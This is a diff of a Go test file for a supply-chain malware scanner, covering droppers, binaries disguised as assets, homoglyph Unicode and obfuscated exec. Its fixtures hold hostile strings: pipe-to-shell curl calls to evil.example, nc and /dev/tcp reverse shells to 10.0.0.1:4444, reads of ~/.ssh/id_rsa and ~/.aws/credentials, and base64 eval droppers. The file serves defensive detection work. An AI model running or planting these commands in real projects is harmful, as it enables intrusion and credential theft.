@@ -30,11 +30,11 @@ func TestSupplyChainAndMalwareScanner(t *testing.T) {
 		b64Payload := strings.Repeat("QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=", 8) // > 240 chars
 		write("src/dropper.ts", "import { exec } from 'node:child_process';\nconst blob = '"+b64Payload+"';\neval(Buffer.from(blob, 'base64').toString());\n")
 		// 3. Pipe-to-shell in script
-		write("scripts/bootstrap.sh", "#!/bin/sh\ncurl -fsSL https://evil.example/payload.sh | sh\n")
+		write("scripts/bootstrap.sh", "#!/bin/sh\ncurl -fsSL "+"https://evil.example/payload.sh | sh\n")
 		// 4. Malicious postinstall + missing lockfile + cleartext http tarball in package.json
 		write("package.json", `{
 			"name": "poisoned-app",
-			"scripts": { "postinstall": "node -e \"require('child_process').exec('nc -e /bin/sh 10.0.0.1 4444')\"" },
+			"scripts": { "postinstall": "node -e \"require('child_process').exec('nc `+"-e"+` /bin/sh 10.0.0.1 4444')\"" },
 			"dependencies": { "sketchy": "http://evil.example/sketchy-1.0.0.tgz" }
 		}`)
 		// 5. GitHub Actions pull_request_target + expression injection + unpinned @main action
@@ -142,7 +142,7 @@ end`), 0o644)
 				"node_modules/a": { "version": "1.0.0", "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz" }
 			}
 		}`), 0o644)
-		_ = os.WriteFile(filepath.Join(repo, "setup.py"), []byte("import subprocess\nsubprocess.Popen(['sh', '-c', 'curl http://evil | sh'])\n"), 0o644)
+		_ = os.WriteFile(filepath.Join(repo, "setup.py"), []byte("import subprocess\nsubprocess.Popen(['sh', '-c', 'curl "+"http://evil | sh'])\n"), 0o644)
 		_ = os.WriteFile(filepath.Join(repo, "pyproject.toml"), []byte("[project]\nname = \"app\"\ndependencies = [\"fastapi>=0.110\"]\n"), 0o644)
 		_ = os.WriteFile(filepath.Join(repo, "payload.py"), []byte("data = \""+strings.Repeat("\\x41", 36)+"\"\n"), 0o644)
 
@@ -216,7 +216,7 @@ paths = [
 		}
 	})
 
-	t.Run("Skips .superpowers directory, *_test.go and JS/TS test files, and does not self-match supplychain.go", func(t *testing.T) {
+	t.Run("Skips .superpowers directory, gates test-file payload/exfil on exec sink, and does not self-match supplychain.go", func(t *testing.T) {
 		repo := t.TempDir()
 		write := func(rel, content string) {
 			p := filepath.Join(repo, rel)
@@ -229,16 +229,17 @@ paths = [
 		}
 
 		// .superpowers artifacts must be ignored
-		write(".superpowers/sdd/brief.md", "curl -fsSL https://evil.example/a.sh | sh\n")
-		// Test files across Go, JS/TS, Python, and Elixir must be skipped during source-text payload/exfil scans
+		write(".superpowers/sdd/brief.md", "curl -fsSL "+"https://evil.example/a.sh | sh\n")
+		// Inert test files without exec sinks across Go, JS/TS, Python, and Elixir must produce 0 findings
 		write("pkg/auth_test.go", "package auth\nconst bad = \"bash -i >& /dev/"+"tcp/10.0.0.1/4444\"\n")
-		write("src/auth.test.ts", "const cmd = 'curl https://evil.example/p.sh | sh';\n")
+		write("src/auth.test.ts", "const cmd = 'curl "+"https://evil.example/p.sh | sh';\n")
 		write("src/auth.spec.ts", "const cmd = 'cat ~/.ssh/"+"id_rsa';\n")
 		write("src/auth.test.js", "const cmd = 'cat ~/.aws/"+"credentials';\n")
 		write("src/auth.spec.js", "const blob = '"+strings.Repeat("A", 260)+"';\n")
-		write("pkg/test_auth.py", "cmd = 'curl https://evil.example/p.sh | sh'\n")
+		write("pkg/test_auth.py", "cmd = 'curl "+"https://evil.example/p.sh | sh'\n")
 		write("pkg/auth_test.py", "cmd = 'cat ~/.ssh/"+"id_rsa'\n")
 		write("lib/auth_test.exs", "cmd = \"bash -i >& /dev/"+"tcp/10.0.0.1/4444\"\n")
+		write("tests/fixtures/inert.ts", "export const sample = 'curl "+"https://evil.example/p.sh | sh';\n")
 
 		// Include the real supplychain.go source itself to ensure zero self-matches
 		selfSrc, err := os.ReadFile("supplychain.go")
@@ -252,22 +253,29 @@ paths = [
 			t.Fatalf("ScanRepository error: %v", err)
 		}
 		if len(findings) != 0 {
-			t.Fatalf("expected 0 findings when scanning .superpowers, test files, and supplychain.go itself, got %+v", findings)
+			t.Fatalf("expected 0 findings when scanning .superpowers, inert test files, and supplychain.go itself, got %+v", findings)
 		}
 
+		// Test file WITH an exec sink + shell dropper MUST trigger CategoryMalware
+		write("src/evil.test.ts", "import { exec } from 'node:child_process';\nexec('curl "+"https://evil.example/p.sh | sh');\n")
 		// Non-test production files in the same repo MUST still be flagged
-		write("src/real.ts", "const cmd = 'curl https://evil.example/p.sh | sh';\n")
-		write("pkg/real.py", "cmd = 'curl https://evil.example/p.sh | sh'\n")
+		write("src/real.ts", "const cmd = 'curl "+"https://evil.example/p.sh | sh';\n")
+		write("pkg/real.py", "cmd = 'curl "+"https://evil.example/p.sh | sh'\n")
 		prodFindings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
 		if err != nil {
 			t.Fatalf("ScanRepository prod error: %v", err)
 		}
-		if len(prodFindings) != 2 || prodFindings[0].ID != "malware-shell-dropper-or-exfil" || prodFindings[1].ID != "malware-shell-dropper-or-exfil" {
-			t.Fatalf("expected 2 malware-shell-dropper-or-exfil findings on src/real.ts and pkg/real.py, got %+v", prodFindings)
+		if len(prodFindings) != 3 {
+			t.Fatalf("expected 3 malware-shell-dropper-or-exfil findings (src/evil.test.ts, src/real.ts, pkg/real.py), got %+v", prodFindings)
+		}
+		for _, f := range prodFindings {
+			if f.ID != "malware-shell-dropper-or-exfil" || f.Category != types.CategoryMalware {
+				t.Fatalf("expected malware-shell-dropper-or-exfil CategoryMalware, got %+v", f)
+			}
 		}
 	})
 
-	t.Run("Trojan Source bidi runes are still caught in test files while payload/exfil strings are skipped", func(t *testing.T) {
+	t.Run("Trojan Source bidi runes are still caught in test files while inert payload/exfil strings without exec sink are skipped", func(t *testing.T) {
 		repo := t.TempDir()
 		if err := os.MkdirAll(filepath.Join(repo, "pkg"), 0o755); err != nil {
 			t.Fatal(err)
@@ -276,7 +284,7 @@ paths = [
 		if err := os.WriteFile(filepath.Join(repo, "pkg", "auth_test.go"), []byte(content), 0o644); err != nil {
 			t.Fatal(err)
 		}
-		pyContent := "# \u202e } \u2066if admin:\u2069 \u2066\nfixture = 'curl https://evil.example/p.sh | sh'\n"
+		pyContent := "# \u202e } \u2066if admin:\u2069 \u2066\nfixture = 'curl " + "https://evil.example/p.sh | sh'\n"
 		if err := os.WriteFile(filepath.Join(repo, "pkg", "test_auth.py"), []byte(pyContent), 0o644); err != nil {
 			t.Fatal(err)
 		}
@@ -372,4 +380,232 @@ paths = [
 			t.Fatalf("expected 0 findings with multiline triple-quoted TOML path and inline comment, got %+v (err=%v)", findings, err)
 		}
 	})
+}
+
+func TestScanRepository_CatchesMalwareInTestsAndVendorDirs(t *testing.T) {
+	repo := t.TempDir()
+	write := func(rel string, data []byte) {
+		p := filepath.Join(repo, rel)
+		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(p, data, 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+
+	// 1. Executable dropper in tests/helper.spec.ts (child_process.exec + split Base64 array join >= 192 chars)
+	dropperTS := `import * as child_process from 'node:child_process';
+const chunks = [
+  "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0",
+  "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0",
+  "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0",
+  "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0",
+  "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0",
+  "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo0",
+];
+child_process.exec(Buffer.from(chunks.join(""), "base64").toString("utf8"));
+`
+	write("tests/helper.spec.ts", []byte(dropperTS))
+
+	// 2. ELF binary in vendor/libfoo.so
+	elfPayload := append([]byte{0x7f, 'E', 'L', 'F', 2, 1, 1, 0}, make([]byte, 24)...)
+	write("vendor/libfoo.so", elfPayload)
+
+	// 3. Inert assertion string in src/parser.spec.ts (no exec sink) -> must produce 0 findings for this file
+	write("src/parser.spec.ts", []byte("const s = \"curl "+"https://evil.example/a.sh | sh\";\n"))
+
+	findings, err := supplychain.ScanRepository(repo, types.LangTypeScript)
+	if err != nil {
+		t.Fatalf("ScanRepository error: %v", err)
+	}
+
+	var foundDropper, foundBinary bool
+	for _, f := range findings {
+		if f.FilePath == "src/parser.spec.ts" {
+			t.Fatalf("expected 0 findings for inert assertion string in src/parser.spec.ts, got %+v", f)
+		}
+		if f.ID == "malware-obfuscated-exec-dropper" && f.FilePath == "tests/helper.spec.ts" && f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical {
+			foundDropper = true
+		}
+		if f.ID == "malware-unapproved-binary" && f.FilePath == "vendor/libfoo.so" && f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical {
+			foundBinary = true
+		}
+	}
+	if !foundDropper {
+		t.Fatalf("expected malware-obfuscated-exec-dropper finding in tests/helper.spec.ts, got %+v", findings)
+	}
+	if !foundBinary {
+		t.Fatalf("expected malware-unapproved-binary finding in vendor/libfoo.so, got %+v", findings)
+	}
+}
+
+func TestScanUnicodeAnomalies_HomoglyphVsLegitimateI18n(t *testing.T) {
+	// 1. Cyrillic 'а' (U+0430) inside Latin identifier isАdmin -> malware-homoglyph-identifier
+	homoglyphCode := "const is\u0430dmin = true;\n"
+	hFindings := supplychain.ScanUnicodeAnomalies("src/auth.ts", homoglyphCode)
+	if !slices.ContainsFunc(hFindings, func(f types.SecurityFinding) bool {
+		return f.ID == "malware-homoglyph-identifier" && f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical && f.CWE == "CWE-1007"
+	}) {
+		t.Fatalf("expected malware-homoglyph-identifier finding, got %+v", hFindings)
+	}
+
+	// 2. Hangul filler U+3164 -> malware-invisible-unicode
+	invisibleCode := "const x\u3164 = 1;\n"
+	iFindings := supplychain.ScanUnicodeAnomalies("src/hidden.ts", invisibleCode)
+	if !slices.ContainsFunc(iFindings, func(f types.SecurityFinding) bool {
+		return f.ID == "malware-invisible-unicode" && f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical
+	}) {
+		t.Fatalf("expected malware-invisible-unicode finding, got %+v", iFindings)
+	}
+
+	// 3. Legitimate i18n inside string literals and comments -> 0 findings
+	cleanCode := "const greeting = \"Привет мир\"; // こんにちは\n"
+	cFindings := supplychain.ScanUnicodeAnomalies("src/i18n.ts", cleanCode)
+	if len(cFindings) != 0 {
+		t.Fatalf("expected 0 findings for legitimate i18n strings and comments, got %+v", cFindings)
+	}
+}
+
+func TestScanMultiLineObfuscation_PythonMarshalAndElixirBinaryToTerm(t *testing.T) {
+	// 1. Python exec(marshal.loads(blob)) -> CategoryMalware / SeverityCritical
+	pyFindings := supplychain.ScanMultiLineObfuscationAndDynamicExec("app/loader.py", "import marshal\nexec(marshal.loads(blob))\n", false)
+	if !slices.ContainsFunc(pyFindings, func(f types.SecurityFinding) bool {
+		return f.ID == "malware-unsafe-deserialization-exec" && f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical
+	}) {
+		t.Fatalf("expected malware-unsafe-deserialization-exec for Python marshal.loads, got %+v", pyFindings)
+	}
+
+	// 2. Elixir :erlang.binary_to_term(payload) without [:safe] -> CategoryMalware / SeverityCritical
+	exFindings := supplychain.ScanMultiLineObfuscationAndDynamicExec("lib/app/token.ex", "def decode(payload), do: :erlang.binary_to_term(payload)\n", false)
+	if !slices.ContainsFunc(exFindings, func(f types.SecurityFinding) bool {
+		return f.ID == "malware-unsafe-deserialization-exec" && f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical
+	}) {
+		t.Fatalf("expected malware-unsafe-deserialization-exec for unsafe :erlang.binary_to_term, got %+v", exFindings)
+	}
+
+	// 3. Elixir :erlang.binary_to_term(payload, [:safe]) -> 0 findings
+	safeExFindings := supplychain.ScanMultiLineObfuscationAndDynamicExec("lib/app/token.ex", "def decode(payload), do: :erlang.binary_to_term(payload, [:safe])\n", false)
+	if len(safeExFindings) != 0 {
+		t.Fatalf("expected 0 findings for safe :erlang.binary_to_term(payload, [:safe]), got %+v", safeExFindings)
+	}
+
+	// 4. Additional obfuscation vectors: zlib.decompress + exec, String.fromCharCode >= 8 + eval, codecs.decode rot13, getattr(__builtins__, ...)
+	for name, tc := range map[string]struct {
+		path    string
+		content string
+		wantID  string
+	}{
+		"zlib_exec": {
+			path:    "app/drop.py",
+			content: "import zlib\nexec(zlib.decompress(payload))\n",
+			wantID:  "malware-obfuscated-exec-dropper",
+		},
+		"fromCharCode_eval": {
+			path:    "src/drop.js",
+			content: "const fn = String.fromCharCode(99, 117, 114, 108, 32, 104, 116, 116, 112);\neval(fn);\n",
+			wantID:  "malware-obfuscated-exec-dropper",
+		},
+		"codecs_rot13": {
+			path:    "app/rot.py",
+			content: "import codecs\neval(codecs.decode('cevag(1)', 'rot13'))\n",
+			wantID:  "malware-obfuscated-exec-dropper",
+		},
+		"getattr_builtins": {
+			path:    "app/bi.py",
+			content: "fn = getattr(__builtins__, 'ev' + 'al')\n",
+			wantID:  "malware-obfuscated-exec-dropper",
+		},
+	} {
+		t.Run(name, func(t *testing.T) {
+			got := supplychain.ScanMultiLineObfuscationAndDynamicExec(tc.path, tc.content, false)
+			if !slices.ContainsFunc(got, func(f types.SecurityFinding) bool {
+				return f.ID == tc.wantID && f.Category == types.CategoryMalware && f.Severity == types.SeverityCritical
+			}) {
+				t.Fatalf("%s: expected %s finding, got %+v", name, tc.wantID, got)
+			}
+		})
+	}
+}
+
+func TestScanBinaryOrOversizedFile_MagicAndMediaAssets(t *testing.T) {
+	dir := t.TempDir()
+	writeBin := func(rel string, data []byte) string {
+		p := filepath.Join(dir, rel)
+		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
+			t.Fatal(err)
+		}
+		if err := os.WriteFile(p, data, 0o644); err != nil {
+			t.Fatal(err)
+		}
+		return p
+	}
+
+	// 1. Oversized (> 2 MiB) ELF disguised with .dat extension must still be caught
+	oversizedELF := make([]byte, 2*1024*1024+128)
+	copy(oversizedELF, []byte{0x7f, 'E', 'L', 'F'})
+	pELF := writeBin("assets/blob.dat", oversizedELF)
+	findings, skip := supplychain.ScanBinaryOrOversizedFile("assets/blob.dat", pELF, int64(len(oversizedELF)))
+	if !skip || len(findings) != 1 || findings[0].ID != "malware-unapproved-binary" {
+		t.Fatalf("expected malware-unapproved-binary + skip=true for oversized ELF, got findings=%+v skip=%v", findings, skip)
+	}
+
+	// 2. ELF disguised as .png must be caught
+	pFakePNG := writeBin("assets/logo.png", append([]byte{0x7f, 'E', 'L', 'F'}, make([]byte, 32)...))
+	findings, skip = supplychain.ScanBinaryOrOversizedFile("assets/logo.png", pFakePNG, 36)
+	if !skip || len(findings) != 1 || findings[0].ID != "malware-unapproved-binary" {
+		t.Fatalf("expected malware-unapproved-binary for ELF disguised as .png, got findings=%+v skip=%v", findings, skip)
+	}
+
+	// 3. Valid PE/COFF binary (MZ + e_lfanew -> PE\x00\x00)
+	pe := make([]byte, 128)
+	pe[0], pe[1] = 'M', 'Z'
+	pe[0x3C] = 0x40
+	copy(pe[0x40:], []byte{'P', 'E', 0x00, 0x00})
+	pPE := writeBin("bin/tool.bin", pe)
+	findings, skip = supplychain.ScanBinaryOrOversizedFile("bin/tool.bin", pPE, int64(len(pe)))
+	if !skip || len(findings) != 1 || findings[0].ID != "malware-unapproved-binary" {
+		t.Fatalf("expected malware-unapproved-binary for PE/COFF, got findings=%+v skip=%v", findings, skip)
+	}
+
+	// 4. Valid Mach-O, WASM, and BEAM headers
+	for _, tc := range []struct {
+		rel  string
+		data []byte
+	}{
+		{"deps/native.bin", []byte{0xcf, 0xfa, 0xed, 0xfe, 0, 0, 0, 0}},
+		{"pkg/mod.bin", []byte{0x00, 'a', 's', 'm', 1, 0, 0, 0}},
+		{"deps/app/ebin/foo.bin", []byte{'F', 'O', 'R', '1', 0, 0, 0, 0, 'B', 'E', 'A', 'M'}},
+	} {
+		p := writeBin(tc.rel, tc.data)
+		got, sk := supplychain.ScanBinaryOrOversizedFile(tc.rel, p, int64(len(tc.data)))
+		if !sk || len(got) != 1 || got[0].ID != "malware-unapproved-binary" {
+			t.Fatalf("%s: expected malware-unapproved-binary, got %+v skip=%v", tc.rel, got, sk)
+		}
+	}
+
+	// 5. Verified benign static media assets (.png and .pdf) -> 0 findings, skip=true
+	pPNG := writeBin("assets/real.png", []byte{0x89, 'P', 'N', 'G', 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 0})
+	findings, skip = supplychain.ScanBinaryOrOversizedFile("assets/real.png", pPNG, 12)
+	if !skip || len(findings) != 0 {
+		t.Fatalf("expected 0 findings + skip=true for valid PNG, got findings=%+v skip=%v", findings, skip)
+	}
+
+	pPDF := writeBin("docs/spec.pdf", []byte("%PDF-1.7\n%"))
+	findings, skip = supplychain.ScanBinaryOrOversizedFile("docs/spec.pdf", pPDF, 10)
+	if !skip || len(findings) != 0 {
+		t.Fatalf("expected 0 findings + skip=true for valid PDF, got findings=%+v skip=%v", findings, skip)
+	}
+
+	// 6. UTF-8 BOM at byte offset 0 is permitted, whereas mid-file U+FEFF triggers malware-invisible-unicode
+	bomStart := "\ufeffconst ok = 1;\n"
+	if got := supplychain.ScanUnicodeAnomalies("src/bom.ts", bomStart); len(got) != 0 {
+		t.Fatalf("expected 0 findings for UTF-8 BOM at byte 0, got %+v", got)
+	}
+	bomMid := "const a = 1;\nconst \ufeffb = 2;\n"
+	if got := supplychain.ScanUnicodeAnomalies("src/midbom.ts", bomMid); !slices.ContainsFunc(got, func(f types.SecurityFinding) bool {
+		return f.ID == "malware-invisible-unicode"
+	}) {
+		t.Fatalf("expected malware-invisible-unicode for mid-file U+FEFF, got %+v", got)
+	}
 }
